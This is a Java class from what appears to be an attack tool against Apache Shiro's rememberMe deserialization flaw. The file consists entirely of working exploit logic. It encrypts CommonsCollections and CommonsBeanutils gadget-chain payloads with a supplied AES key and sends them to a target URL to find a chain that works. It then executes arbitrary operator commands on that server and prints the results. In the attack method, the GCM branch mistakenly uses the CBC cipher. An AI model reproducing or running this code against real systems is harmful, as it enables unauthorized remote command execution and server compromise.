package core;

import entity.ControllersFactory;
import gadgets.CommonsBeanutils;
import gadgets.CommonsCollectionsK1;
import gadgets.CommonsCollectionsK2;
import ui.MainController;
import utils.HttpUtils;
import utils.createAESCBCCipher;
import utils.createAESGCMCipher;



public class GadgetsDetect {
    String gadget ="";
    final private MainController myController = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
    public String GadgetsCrack(String url, String key, String mode) throws Exception {
        CommonsCollectionsK1(url,key,mode);
        CommonsCollectionsK2(url,key,mode);
        CommonsBeanutils(url,key,mode);
        return gadget;
    }

    public void GadgetsAttack(String url, String key, String mode, String gadgets, String command ) throws Exception {
        String payload = "";
        if (gadgets.equals("CommonsCollectionsK1")){
            Object obj = new CommonsCollectionsK1().getObject();
            if (mode.equals("CBC")){
                payload = createAESCBCCipher.encrypt(key, obj);
            } else if (mode.equals("GCM")) {
                payload = createAESCBCCipher.encrypt(key, obj);
            }
            String result = HttpUtils.getShell(url, payload, command);
            this.myController.result.appendText("[*]利用链CommonsCollectionsK1\n[*]执行"+command+"\n");
            this.myController.result.appendText("[*]"+result+"\n");
        } else if (gadgets.equals("CommonsCollectionsK2")) {
            Object obj = new CommonsCollectionsK2().getObject();
            if (mode.equals("CBC")){
                payload = createAESCBCCipher.encrypt(key, obj);
            } else if (mode.equals("GCM")) {
                payload = createAESCBCCipher.encrypt(key, obj);
            }
            String result = HttpUtils.getShell(url, payload, command);
            this.myController.result.appendText("[*]利用链CommonsCollectionsK2\n[*]执行"+command+"\n");
            this.myController.result.appendText("[*]"+result+"\n");
        } else if (gadgets.equals("CommonsBeanutils")) {
            Object obj = new CommonsBeanutils().getObject();
            if (mode.equals("CBC")){
                payload = createAESCBCCipher.encrypt(key, obj);
            } else if (mode.equals("GCM")) {
                payload = createAESCBCCipher.encrypt(key, obj);
            }
            String result = HttpUtils.getShell(url, payload, command);
            this.myController.result.appendText("[*]利用链CommonsBeanutils\n[*]执行"+command+"\n");
            this.myController.result.appendText("[*]"+result+"\n");
        }

    }

    public String CommonsCollectionsK1(String url, String key, String mode) throws Exception {
        String payload = "";
        CommonsCollectionsK1 commonsCollectionsK1 = new CommonsCollectionsK1();
        Object obj = commonsCollectionsK1.getObject();
        if (mode.equals("CBC")){
            payload = createAESCBCCipher.encrypt(key, obj);
        }else {
            payload = createAESGCMCipher.encrypt(key,obj);
        }
        String res = HttpUtils.getHeader(url, payload);
        if(!res.contains("deleteMe")){
            if(gadget.equals("")){
                gadget = "CommonsCollectionsK1";
            }
        }
        return gadget;
    }

    public String CommonsCollectionsK2(String url, String key, String mode) throws Exception {
        String payload = "";
        CommonsCollectionsK2 commonsCollectionsK2 = new CommonsCollectionsK2();
        Object obj = commonsCollectionsK2.getObject();
        if (mode.equals("CBC")){
            payload = createAESCBCCipher.encrypt(key, obj);
        }else {
            payload = createAESGCMCipher.encrypt(key,obj);
        }
        String res = HttpUtils.getHeader(url, payload);
        if(!res.contains("deleteMe")){
            if(gadget.equals("")){
                gadget = "CommonsCollectionsK2";
            }
        }
        return gadget;
    }

    public String CommonsBeanutils(String url, String key, String mode) throws Exception {
        String payload = "";
        CommonsBeanutils CommonsBeanutils = new CommonsBeanutils();
        Object obj = CommonsBeanutils.getObject();
        if (mode.equals("CBC")){
            payload = createAESCBCCipher.encrypt(key, obj);
        }else {
            payload = createAESGCMCipher.encrypt(key,obj);
        }
        String res = HttpUtils.getHeader(url, payload);
        if(!res.contains("deleteMe")){
            if(gadget.equals("")){
                gadget = "CommonsBeanutils";
            }
        }
        return gadget;
    }

}
